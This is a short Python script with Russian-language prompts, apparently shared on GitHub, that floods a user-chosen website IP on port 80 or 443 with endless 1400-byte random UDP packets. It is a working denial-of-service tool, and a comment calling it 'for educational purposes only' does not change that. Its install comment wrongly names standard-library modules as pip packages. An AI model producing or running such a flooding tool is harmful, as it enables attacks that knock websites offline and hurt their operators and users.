#!/usr/bin/env python
#pip install socket,random
#use auto-py-to-exe)))
#made by github.com/youngt1m (for educational purposes only) 

import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1400)

print('Узнать айпи сайта:https://www.reg.ru/web-tools/checkip')
ip = input('Введите IP:')
print('Посмотрите на начало ссылки сайта: если в начале http - порт 80, если https - порт 443')
port = input('Введите порт(80 или 443):')
while port != '80' and port != '443':
    print('нужно выбрать порт 80 или 443')
    port = input('Введите порт(80 или 443):')

sent = 0

print('start')

while True:
    sock.sendto(bytes, (ip, int(port)))
    sent += 1
    print('отправлено {0} пакетов на {1} через порт {2}'.format(sent,ip,port))


